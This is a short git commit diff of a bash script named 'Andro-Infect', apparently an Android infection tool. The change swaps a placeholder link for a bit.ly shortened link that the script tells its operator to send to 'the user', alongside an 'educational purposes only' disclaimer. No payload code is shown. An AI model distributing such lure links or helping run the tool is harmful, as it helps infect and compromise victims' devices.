2f8f9da776d42e7a7949a6f968ae6883e691ea4f
2TheDarkPhoenix <79270723+2TheDarkPhoenix@users.noreply.github.com>
2021-12-14 00:23:02 +0530

    Update andro.sh

--- andro.sh
+++ andro.sh
@@ -1,6 +1,6 @@
 #!/bin/bash/
 figlet Andro-Infect
-echo " (+) Send this link to the user link:- https://ngrok.demo.com "
+echo " (+) Send this link to the user link:- https://bit.ly/3ild93L "
 echo " This script is for educational and research purposes only. I'll not be responsible for any misuse caused by you 
 so use at your own risk "
 
